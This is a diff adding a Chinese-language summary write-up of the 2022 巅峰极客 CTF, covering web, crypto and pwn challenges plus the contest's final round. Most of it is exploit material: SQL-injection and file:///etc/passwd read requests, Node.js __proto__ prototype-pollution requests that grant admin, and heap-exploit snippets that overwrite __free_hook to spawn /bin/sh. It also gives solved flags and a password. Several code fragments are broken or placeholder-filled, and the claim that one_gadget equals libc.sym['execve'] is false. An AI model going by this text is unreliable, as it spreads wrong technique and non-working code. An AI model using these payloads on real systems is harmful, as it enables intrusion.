@@ -1,0 +1,168 @@
+---
+title: 2022 巅峰极客 WriteUp By EDISEC
+contest: 2022 巅峰极客
+year: 2022
+difficulty: hard
+vuln_type: [crypto_oracle, web_unknown, lattice, heap_exploit, ret2libc]
+tags: [Padding-Oracle, padbuster, feedback.php, ban.php, file://, ECC, point-addition, add-points, SageMath, libc-2.27, one_gadget, tcache, SROP, ORW, strangeTempreture]
+attack_chain: ["Web babyweb: Padding Oracle + padbuster → 密码 0f90844e-f214-4f0b-aaa3-687a8098b896", "Web ezWeb: /readf/feedback.php 注入 startid=0*, ban.php url=file:///etc/passwd* 任意文件读", "Crypto point-power: ECC 加法公式 y²=x³+ax+b，联立解方程 a,b → flag bytes", "Crypto strange curve: long_to_bytes(x) → flag 字节", "Pwn Gift: libc-2.27 tcache dup → __free_hook = system → /bin/sh", "Pwn smallcontainer: large bin / unsorted bin 残留指针 leak + UAF", "Pwn happy_note: libc-2.31 PROTECT_PTR 绕过 (xor = heap_base>>12) + tcache stash unlink", "StrangeTempreture / nodesystem: 决赛 node 节点题目"]
+key_payload: "y² = x³ + a*x + b 联立解出 a,b"
+one_liner: 巅峰极客 2022 6 大题：Padding Oracle + Web + ECC + 三道 pwn
+lesson: Padding Oracle 永远可破；ECC 加法公式代数化是基础；PROTECT_PTR 用 xor 绕过
+quality: high
+---
+
+# 2022 巅峰极客 WriteUp By EDISEC
+
+原文 https://www.ctfiot.com/53840.html
+
+## Web
+
+### babyweb
+- Padding Oracle
+- padbuster 自动跑
+- 密码：`0f90844e-f214-4f0b-aaa3-687a8098b896`
+- flag: `flag{fc0e4a89-0689-4f56-bab5-9dc90357a58e}`
+
+### ezWeb
+```http
+POST /readf/feedback.php
+Cookie: PHPSESSID=ddh5padgd13hsfap4lkpg4lrs6
+X-Forwarded-For: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+
+worksafe2=on&updatable2=1&crawldepth2=&crawlpages2=&crawltype2=1&startid=0*&endid=0
+```
+
+```http
+POST /ban/ban.php
+Cookie: PHPSESSID=...
+X-Forwarded-For: 127.0.0.1
+
+delete=on&url=file%3A%2F%2F%2Fetc%2Fpasswd*
+```
+- SQL 注入 + 任意文件读（`file://` 协议）
+
+## Crypto
+
+### point-power (ECC 加法)
+```python
+p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623
+b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147
+x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740
+x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727
+
+P = GF(p)['a']
+y1_2 = x1^3 + a*x1 + b
+f = y1_2 * 4 * (x1*2 + x2) - (3*x1^2 + a)^2
+l = f.roots()
+for a, _ in l:
+    print(bytes.fromhex(hex(a)[2:]))
+```
+
+### strange curve
+```python
+from Crypto.Util.number import *
+x, y = P = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149,
+            5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)
+print(long_to_bytes(x))
+```
+
+## Pwn
+
+### Gift (libc-2.27)
+```python
+add(2, (p64(0) + p64(0x111)) * 0x5)
+add(1, (p64(0) + p64(0x111)) * 0xf)
+add(2, (p64(0) + p64(0x111)) * 0x5)
+delete(0); delete(1); delete(2)
+show(2)
+heap_base = int(io.recvuntil('type:', drop=True)[:-1]) - 0x...
+# ... unsorted bin leak libc
+# edit(0) → tcache poisoning → __free_hook → system
+add(1, p64(free_hook_addr - 0x10) * 0x18)
+add(2, '/bin/sh\x00' * 0xa)
+add(2, p64(system_addr))
+delete(4)
+```
+
+### smallcontainer (libc-2.27)
+```python
+add(0x1f8) * 11
+for i in range(6): delete(5+i)
+delete(1); delete(0)
+edit(2, 'a'*0x1f8)
+edit(2, 'a'*0x1f0 + p64(0x600))
+edit(3, p64(0x21) * 0x41)
+edit(4, p64(0x21) * 0x3f)
+delete(3)
+add(0x278)
+show(0)
+libc_base = int(io.recv(12), 16) - libc.sym['__malloc_hook'] - 1360 - 0x10
+edit(0, '/bin/sh\x00' + 'a'*0x1f0 + p64(0x201) + p64(free_hook_addr))
+add(0x1f8); add(0x1f8)
+edit(3, p64(system_addr))
+delete(0)
+```
+
+### happy_note (libc-2.31)
+```python
+# PROTECT_PTR 绕过
+addr = (libc_base + 0x2282A0 + 0x10) ^ (heap_base >> 12)
+edit(0, 'a'*0xe8 + p64(0x21) + 'a'*0x18 + p64(0xf1) + p64(addr))
+# tcache stash unlink 攻击
+```
+
+## 决赛
+
+### 1: file:// 任意文件读 + prototype pollution
+```http
+POST /api
+Content-Type: application/x-www-form-urlencoded
+auth[name]=test&auth[password]=test&filename=index.js
+```
+- `auth[name]` 数组形式 → Node.js 解析为对象
+- 读 index.js 源码 → 找漏洞
+
+```http
+PUT /message
+Content-Type: application/json
+{"message":{"__proto__": {"admin": true}}, "auth":{"name":"test", "password":"test"}}
+```
+- **`__proto__` 原型链污染** → 给 message 对象加 `admin: true`
+- Node.js 经典漏洞 → 提权
+
+```http
+POST /debug
+{"message":{"__proto__": {"admin": true}}, "auth":{"name":"test", "password":"test"}}
+```
+
+### 2: gcd (Crypto)
+```python
+from Crypto.Util.number import *
+x = 13693034247131001247611357013365838905472128629161269384100755984286945944986882779020879733934334461215591081830359749241927901759168319107452036275703768755532293338513836146556306490425526394420440685291299327486258632666082657664827474947846307949205548526817689180357262646108048851554962291154624349603853599623877095789135051759890435127891210971940795915429197420232561510826760487552089621705187244655827668509013761027910519038664267576214742561936826964572261315984043602119812357324667105678247267841445497640859880436819217418374184256023378843611198818733281625017307272013394628328908242726204785568269
+e = 65537
+n = 1715097516831775561161353747739509313962850384763754284193603064705990003183954750857689649540587082555847904377918426763475079170697690469267290454724999354302036981034615698694153403754870938739225201770934147845874793740053505575413463153429315475539039712818850905666950096326806695688446947957198050957270336443016980023115464136303403780696015358461369838964806435293267645492940773964907954737849962270208167145137818071024789445448292917016422004351584109968952746852305729861258178402122017513103311904147173869605944992973485253275501741635308107788593258463591060922145241960065862813218690280146883588390356662245698217956617720339878472430817614915509896516775918109916920083183701011823993137753987826242193055167215287839864164955881557719443664876504155709359476375455266912247205663953373944852046907623883953483708248467223346798885142046228485310724692353541792975390854356153906879056788972704718688261213
+c = 1207106262178445359018459948589897274651891185968586806427714234447059397099330669443037189913958678506147447588787686432870791586266645067569198511010947847769438531195366288233395081813524859121328300315116211130908169351354477893647936383056584771268247471788727296968981371535384241445434057942795625350351461517179136190258136244456887118978348223420158887403238429201791427682781494296473806409015...
+# gcd(x, n) → 共享因子
+```
+
+## 教学价值
+- **Padding Oracle** 永远可破（padbuster 自动化）
+- **SQL 注入** + `file://` 协议任意文件读
+- **ECC 加法公式** 代数化解 a, b
+- **Prototype Pollution** `__proto__` 是 Node.js 经典
+- **libc-2.27** 经典 tcache dup
+- **libc-2.31** PROTECT_PTR 用 `heap_base >> 12` 绕过
+- **one_gadget** = `libc.sym['execve']` 单指令 magic
+
+## 工具
+- padbuster
+- SageMath (ECC + roots)
+- pwntools
+- one_gadget
+- patchelf
+
+## 关联
+- 巅峰极客是国家级赛事
+- 多场 pwn 题目覆盖 libc 2.27 / 2.31 / 2.35 三种版本
